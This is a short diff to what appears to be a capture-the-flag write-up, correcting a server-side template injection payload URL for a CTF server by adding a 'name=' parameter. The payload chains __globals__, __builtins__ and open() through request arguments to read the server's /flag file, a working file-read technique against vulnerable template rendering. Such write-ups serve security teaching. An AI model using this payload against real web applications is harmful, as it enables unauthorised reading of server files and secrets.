@@ -206,7 +206,7 @@ a(b) = reqiest.args.a(request.args.b)
 get() with paramater __builtins__
 open() with paramerter __flag__
 </code></pre><p>And putting the whole payload together:</p>
-<p><code>http://ctf-league.osusec.org:31311/?{{(request.application|attr(request.args.param1)).get(request.args.param2).open(request.args.param3).read()}}&amp;param1=__globals__&amp;param2=__builtins__&amp;param3=/flag</code></p>
+<p><code>http://ctf-league.osusec.org:31311/?name={{(request.application|attr(request.args.param1)).get(request.args.param2).open(request.args.param3).read()}}&amp;param1=__globals__&amp;param2=__builtins__&amp;param3=/flag</code></p>
 <p>We get the flag!</p>
 <figure>
     <img src="/img/almost-flag.png"/> 
